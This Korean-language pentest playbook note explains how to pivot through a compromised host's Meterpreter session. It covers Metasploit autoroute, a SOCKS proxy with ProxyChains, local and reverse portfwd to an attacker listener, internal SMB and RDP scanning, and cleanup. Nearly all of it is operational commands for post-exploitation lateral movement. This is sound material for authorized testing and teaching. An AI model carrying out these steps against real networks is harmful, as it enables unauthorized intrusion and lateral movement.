---
tags:
  - 환경/linux
  - 환경/windows
시작조건: ["공격 호스트의 Metasploit에 피벗 호스트 Meterpreter 세션 유지", "피벗 호스트에서 <INTERNAL_IP>:<PORT> 연결 가능"]
필요권한: ["피벗 호스트의 현재 Meterpreter 세션 권한"]
필요조건: ["피벗 세션에서 <INTERNAL_CIDR>로 route 가능", "공격 호스트의 Metasploit console에서 해당 SESSION_ID 제어 가능", "ProxyChains 사용 시 SOCKS listener의 버전·주소·포트와 설정 일치"]
결과: ["Metasploit의 <INTERNAL_CIDR> route", "공격 호스트의 SOCKS4a 프록시", "공격 호스트 로컬 포트에서 <INTERNAL_IP>:<PORT>로의 포트 포워딩", "피벗 호스트 수신 포트에서 공격 호스트 listener로의 역방향 포워딩"]
---

# Meterpreter 라우팅과 포트 포워딩

## 한 줄 판단

공격 호스트의 Metasploit에 `<PIVOT_IP>` Meterpreter 세션이 유지되고 해당 호스트에서 `<INTERNAL_IP>:<PORT>`로 연결할 수 있으면, 공격 호스트에서 `autoroute`·SOCKS 또는 세션 내 `portfwd`를 구성해 내부 TCP 경로를 얻는다.

## 사용할 때

- 현재 보유 접근: 공격 호스트의 `msfconsole`에 `<PIVOT_IP>`에서 실행 중인 `<SESSION_ID>` Meterpreter 세션이 유지된다.
- 명령 실행 위치: `route`·SOCKS 모듈은 공격 호스트의 Metasploit console에서, `ipconfig`·`portfwd`는 피벗 호스트의 Meterpreter 세션에서 실행한다.
- 도달해야 하는 대상: 피벗 호스트에서는 `<INTERNAL_IP>:<PORT>`가 응답하지만 공격 호스트에서는 직접 도달하지 못한다.
- 현재 계정·권한: `getuid`로 피벗 세션의 실행 계정을 확인하며, 세션 확보 자체는 피벗 호스트의 관리자 권한이나 내부 대상의 서비스 권한을 의미하지 않는다.
- 지금 가능한 행동·성공 범위: 전체 `<INTERNAL_CIDR>`이 필요하면 route와 SOCKS, 특정 `<INTERNAL_IP>:<PORT>`만 필요하면 `portfwd`를 구성한다. 성공해도 TCP 경로만 확보하며 인증·원격 실행·관리자 권한은 최종 서비스에서 별도로 검증한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 공격 호스트의 Metasploit과 내부 NIC가 있는 피벗 호스트 세션 연결 | `sessions -l`, `meterpreter > ipconfig` | 세션 상태와 피벗 호스트의 내부 NIC·CIDR 재확인 |
| 현재 계정 또는 인증 수단 | `<SESSION_ID>`의 Meterpreter 세션 유지 | `meterpreter > getuid` | 세션을 재연결하고 실행 계정 확인 |
| 현재 권한 | 세션 프로세스가 내부 대상으로 TCP 연결 생성 가능 | 피벗 호스트에서 `<INTERNAL_IP>:<PORT>` 서비스 응답 확인 | 피벗 호스트의 route·방화벽·현재 프로세스 제한 확인 |
| 공격 대상의 조건 | `<INTERNAL_CIDR>` 또는 `<INTERNAL_IP>:<PORT>`가 피벗 호스트에서 도달 가능 | `ipconfig` 또는 `route print`로 CIDR을 정하고 피벗 호스트에서 최종 포트 확인 | 최종 hop을 먼저 복구한 뒤 route 추가 |
| 필요한 파일·목록·주소 | `<SESSION_ID>`, `<INTERNAL_CIDR>`, `<INTERNAL_IP>`, `<PORT>` | 세션 목록과 피벗 호스트의 라우팅 테이블을 대조 | 잘못된 CIDR·session ID·주소 수정 |

## 실행

### 선택 기준
| 단서 | 의미 | 다음 행동 |
|---|---|---|
| 세션 호스트에 내부 NIC 존재 | route 추가 가능 | `autoroute` 설정 |
| 여러 내부 서비스 탐색 | SOCKS proxy 적합 | `auxiliary/server/socks_proxy` 사용 |
| 특정 내부 포트 하나만 필요 | `portfwd`가 간단함 | 로컬 포트로 포워딩 |
| reverse 방향이 필요 | 내부 대상 콜백을 중계해야 함 | `portfwd add -R` 검토 |

### 절차
1. 피벗 호스트의 Meterpreter 세션에서 실행 계정, 내부 인터페이스와 route를 확인한다.
2. 공격 호스트의 Metasploit console에서 `autoroute`로 `<INTERNAL_CIDR>`을 `<SESSION_ID>`에 연결한다.
3. Metasploit 모듈만 사용할지, 공격 호스트의 ProxyChains용 SOCKS를 열지 선택한다.
4. 단일 포트가 목적이면 피벗 호스트의 Meterpreter 세션에서 `portfwd`로 공격 호스트 로컬 포트에 매핑한다.
5. 공격 호스트에서 내부 서비스의 TCP 응답을 확인한 뒤, 인증·세션·권한을 별도로 검증한다.

### 내부 대역 확인

```text
meterpreter > ipconfig
meterpreter > background
msf6 > route print
```

확인할 출력:

- 피벗 세션이 실행 중인 호스트의 내부 IP와 CIDR, `sessions -l`의 session ID. NIC 표시만으로 `<INTERNAL_IP>:<PORT>` 도달이 입증되지는 않는다.

### autoroute와 SOCKS proxy

#### 권장 방식: post 모듈

```text
meterpreter > background
msf6 > sessions -l
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION <SESSION_ID>
msf6 post(multi/manage/autoroute) > set CMD add
msf6 post(multi/manage/autoroute) > set SUBNET <INTERNAL_SUBNET>
msf6 post(multi/manage/autoroute) > set NETMASK <NETMASK>
msf6 post(multi/manage/autoroute) > run
msf6 > route print
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > run -j
```

확인할 출력:

- `route print`에 `<INTERNAL_CIDR>`과 `<SESSION_ID>`가 연결된 항목.
- 공격 호스트에서 SOCKS4a proxy job이 실행 중인 상태. route와 job 생성은 아직 최종 서비스 접근 성공이 아니다.

#### 대안: Meterpreter의 레거시 autoroute 스크립트

실행 위치: 내부 NIC가 있는 피벗 호스트의 Meterpreter 프롬프트.

```text
meterpreter > run autoroute -s <INTERNAL_CIDR>
meterpreter > run autoroute -p
```

확인할 출력:

- `[+] Added route to <SUBNET>/<NETMASK> via <SESSION_HOST>`가 표시되고 `Active Routing Table`에 대상 CIDR과 현재 session이 나타나야 한다.
- `Meterpreter scripts are deprecated`는 레거시 문법 경고다. 이 경고만 출력되고 `[+] Added route`가 없으면 route가 생성됐다고 판단하지 않는다.
- 새 구성에서는 공격 호스트의 Metasploit console에서 `post/multi/manage/autoroute`를 우선 사용한다. 두 방식을 연속으로 실행해 같은 route를 중복 추가하지 않는다.

#### `Invalid :session` 오류 확인

레거시 `run autoroute -s`에서 `ArgumentError Invalid :session, expected Session object`가 나와도 route 추가가 먼저 처리됐을 수 있다. 같은 route를 즉시 다시 추가하지 말고 현재 세션과 활성 route를 먼저 대조한다.

```text
meterpreter > background
msf6 > sessions -l
msf6 > route print
```

- 대상 CIDR의 gateway가 현재 살아 있는 `<SESSION_ID>`이면 route는 등록된 상태다. 같은 console의 Metasploit TCP scanner로 내부 단일 포트를 확인한다.
- 대상 CIDR이 이전 session ID를 가리키면 해당 항목만 `route remove <INTERNAL_SUBNET> <NETMASK> <OLD_SESSION_ID>`로 제거한 뒤 post 모듈로 현재 session에 다시 추가한다.
- 대상 CIDR이 없으면 post 모듈에 현재 `<SESSION_ID>`, `<INTERNAL_SUBNET>`, `<NETMASK>`, `CMD add`를 명시해 추가한다.
- post 모듈에서도 같은 오류가 반복되면 다시 `route print`를 확인한다. route가 없을 때만 `version`, `db_status`, `sessions -l`을 수집해 Metasploit 버전과 session 등록 상태를 점검한다.

### Metasploit route로 내부 SMB 후보 탐색

route가 생성된 뒤 Metasploit 모듈은 별도 ProxyChains 없이 해당 route를 사용할 수 있다. 내부 Windows 호스트 후보를 찾을 때 139·445/TCP처럼 목적에 필요한 포트만 먼저 확인한다.

```text
meterpreter > background
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS <INTERNAL_CIDR>
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 139,445
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50
msf6 auxiliary(scanner/portscan/tcp) > run
```

확인할 출력:

- `[+] <INTERNAL_IP>:445 - TCP OPEN`처럼 호스트와 열린 포트가 함께 표시됨.
- route가 있다고 모든 주소가 Windows이거나 원격 실행 가능하다는 뜻은 아니다. 열린 호스트만 후속 SMB 지문·인증 대상으로 넘긴다.

### SOCKS 버전과 ProxyChains 설정 일치

SOCKS4a 9050을 사용하는 경우:

```text
[ProxyList]
socks4 127.0.0.1 9050
```

Metasploit 모듈의 현재 기본값인 SOCKS5 1080을 사용하는 경우에는 값을 확인한 뒤 그대로 실행할 수 있다.

```text
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options
msf6 auxiliary(server/socks_proxy) > run -j
```

```text
[ProxyList]
socks5 127.0.0.1 1080
```

`show options`에서 실제 `VERSION 5`, `SRVHOST 0.0.0.0`, `SRVPORT 1080`을 확인한다. 기본값이 다르면 그때 `set VERSION 5` 또는 `set SRVPORT 1080`으로 맞춘다. `0.0.0.0`으로 수신해도 로컬 ProxyChains는 `127.0.0.1:1080`으로 연결할 수 있으며, 다른 인터페이스에서 SOCKS 연결을 받지 않으려면 선택적으로 `set SRVHOST 127.0.0.1`을 사용한다. SOCKS4a listener에 `socks5`를 쓰거나 포트를 다르게 적으면 job이 실행 중이어도 최종 연결은 실패한다.

### 반복 연결 타임아웃 시 Chisel 전환

ProxyChains 출력에서 첫 TCP 연결은 `OK`지만 같은 클라이언트의 다음 연결이 timeout되면, 비밀번호나 SMB 권한을 판단하기 전에 Meterpreter 세션 응답을 확인한다.

```text
msf6 > sessions -i <SESSION_ID>
meterpreter > getuid
```

- `getuid`가 즉시 반환되면 route, SOCKS protocol·port와 피벗 호스트에서 대상 포트까지의 도달성을 한 번만 다시 확인한다.
- 같은 단일 대상에서 두 번째 연결 timeout이 반복되거나 `getuid`도 timeout이면 외부 요청을 중단한다. 해당 출력은 SMB 인증 실패가 아니라 Meterpreter 명령·피벗 채널이 응답하지 않는 상태다.
- 새 Meterpreter 세션을 확보한 뒤 Windows용 Chisel을 전송하고 [[Chisel SOCKS 터널링]]의 reverse SOCKS로 전환한다. Chisel 경로는 Metasploit `autoroute`와 `socks_proxy`를 사용하지 않는다.

### ProxyChains로 내부 RDP 확인

```bash
proxychains nc -vz <INTERNAL_IP> 3389
proxychains nmap -sT -Pn -n -p3389 <INTERNAL_IP>
```

확인할 출력:

- ProxyChains 체인이 공격 호스트의 `127.0.0.1:9050` SOCKS4a listener와 Meterpreter route를 거쳐 `<INTERNAL_IP>:3389`에 연결된다. `OK`·`open`은 TCP 도달 증거이며 RDP 인증 증거가 아니다.

### 단일 포트 포워딩

```text
meterpreter > portfwd add -l 13389 -p 3389 -r <INTERNAL_IP>
```

```bash
xfreerdp /v:127.0.0.1:13389 /u:<USER> /p:'<PASSWORD>'
```

확인할 출력:

- 공격 호스트의 `127.0.0.1:13389`에 접속한 RDP 클라이언트 트래픽이 피벗 세션을 거쳐 `<INTERNAL_IP>:3389`로 전달된다. GUI 세션이 열려야 `<USER>`의 인증과 RDP 로그온 권한까지 확인된다.

### 역방향 포트 포워딩

내부 대상이 공격 호스트로 직접 연결할 수 없지만 피벗 호스트의 포트에는 연결할 수 있을 때 사용한다.

```text
meterpreter > portfwd add -R -l <ATTACKER_LISTENER_PORT> -p <PIVOT_LISTEN_PORT> -L <ATTACKER_IP>
meterpreter > portfwd list
```

확인할 출력:

- `Local TCP relay created: <ATTACKER_IP>:<ATTACKER_LISTENER_PORT> <-> :<PIVOT_LISTEN_PORT>`는 relay 생성을 뜻한다.
- 내부 대상의 연결이 피벗 호스트 `<PIVOT_LISTEN_PORT>`에 도착한 뒤 공격 호스트 `<ATTACKER_IP>:<ATTACKER_LISTENER_PORT>`의 listener까지 전달되는지 별도로 확인한다.
- listener 시작만으로 payload 실행이나 Meterpreter 세션 획득을 판단하지 않는다. `session opened`와 새 세션의 `getuid`를 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| Meterpreter `ipconfig`에 내부 NIC·CIDR이 보임 | 세션 호스트가 피벗 후보임 | 내부 대역 후보 | 세션에서 내부 포트 baseline 확인 |
| 세션 호스트에서 내부 포트가 직접 도달함 | 최종 내부 hop이 유효함 | 내부 TCP baseline | `autoroute`에 정확한 CIDR 추가 |
| `route print`에 CIDR과 session이 연결됨 | Metasploit route가 생성됨 | 내부망 route | SOCKS job 또는 Metasploit 모듈 실행 |
| 레거시 `run autoroute -s` 뒤 `[+] Added route`와 활성 route가 표시됨 | 현재 Meterpreter 세션을 통한 Metasploit route 생성 성공 | 내부망 route | SOCKS job을 실행하고 ProxyChains TCP 연결 확인 |
| `Invalid :session` 뒤 `route print`에 현재 session route가 있음 | route 추가 뒤 session 정보 처리에서 오류가 발생했을 가능성이 있음 | 내부망 route | 같은 console의 Metasploit TCP scanner로 단일 포트 확인 |
| `route print`의 대상 CIDR이 종료된 session을 가리킴 | 재연결 전 route가 남아 있음 | 오래된 route | 해당 route만 제거하고 현재 session으로 다시 추가 |
| SOCKS job이 실행되고 ProxyChains `nc`가 `OK`·`open` | route, listener, proxy hook이 모두 동작함 | SOCKS 경유 내부 접근 | `nmap -sT -Pn -n`과 최종 클라이언트 실행 |
| Metasploit TCP scanner가 내부 139·445 포트를 반환함 | Metasploit route를 통한 내부 TCP 연결과 Windows 서비스 후보 확인 | 내부 SMB 호스트 후보 | SOCKS를 통해 SMB 지문과 인증을 별도 검증 |
| `portfwd list`에 mapping이 있고 공격 호스트의 로컬 포트에서 `<INTERNAL_IP>:<PORT>` 서비스가 응답함 | 단일 포트 포워딩 성공 | 공격 호스트에서 내부 단일 서비스 TCP 접근 | 서비스별 인증, 원격 실행, 실제 권한을 별도 확인 |
| reverse mapping이 표시되고 피벗 수신 포트로 보낸 연결이 공격 호스트 listener에 도착함 | 역방향 relay가 동작함 | reverse callback 경로 | payload 세션이 열리면 대상 호스트와 `getuid`를 확인 |
| autoroute 오류 뒤 `route print`에도 대상 CIDR이 없음 | session ID·CIDR 오류 또는 session 등록 문제 | route 미생성 | 현재 session ID와 CIDR을 확인하고 post 모듈로 재실행 |
| SOCKS는 열렸지만 `nc`가 실패함 | route 또는 SOCKS4a·port 설정이 맞지 않음 | listener만 확보 | `route print`, proxy protocol과 피벗 baseline 비교 |
| 첫 연결 `OK` 뒤 다음 연결이 timeout되고 `getuid`도 timeout | Meterpreter 명령·피벗 채널이 함께 응답하지 않음 | Meterpreter SOCKS 경로 사용 중단 | 새 세션에서 [[Chisel SOCKS 터널링]]으로 전환 |
| `nc`는 성공하지만 Nmap만 불명확함 | raw scan 또는 터널 판정 문제 | 내부 TCP 접근 유지 | TCP connect scan과 실제 클라이언트 우선 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| 세션 | `sessions -l`, `getuid`, `ipconfig` | 피벗 identity와 네트워크 위치 확인 |
| 내부 baseline | 세션 호스트에서 내부 포트 연결 성공 | route 생성 전 최종 hop 확정 |
| route·listener | `route print`, SOCKS job, `portfwd list` | 경로와 수신 포트를 별도 확인 |
| proxy·최종 TCP | SOCKS4a 설정, ProxyChains `OK`, `nc open`, 서비스 응답 | listener 생성과 실제 내부 접근을 구분 |

## 변경 영향과 복구

추가한 route, SOCKS job과 portfwd를 각각 식별해 제거한다. 다른 세션이 사용하는 route나 job은 일괄 삭제하지 않는다.

```text
msf6 > route remove <INTERNAL_SUBNET> <NETMASK> <SESSION_ID>
msf6 > jobs -l
msf6 > jobs -k <SOCKS_JOB_ID>
meterpreter > portfwd delete -l <LOCAL_PORT>
meterpreter > portfwd list
meterpreter > portfwd delete -i <REVERSE_FORWARD_INDEX>
meterpreter > portfwd list
msf6 > route print
```

확인할 출력:

- 해당 CIDR이 `route print`에서 사라지고 SOCKS job과 로컬 portfwd가 더 이상 표시되지 않는다.
- reverse port forward를 만들었다면 생성할 때 사용한 원격·로컬 포트가 일치하는 mapping을 제거한다.

## 관련 상태 라우터

- route 또는 포트 포워딩으로 내부 대상에 도달했으면: [[내부망 경로 확보 후 피벗 구성]]

## 관련 도구

- [[meterpreter]]
- [[metasploit]]
- [[chisel]]
- [[proxychains]]
- [[xfreerdp]]

## 관련 노트

- [[Meterpreter 세션 후속 행동]]
- [[ICMP 기반 내부 호스트 확인]]
- [[Chisel SOCKS 터널링]]
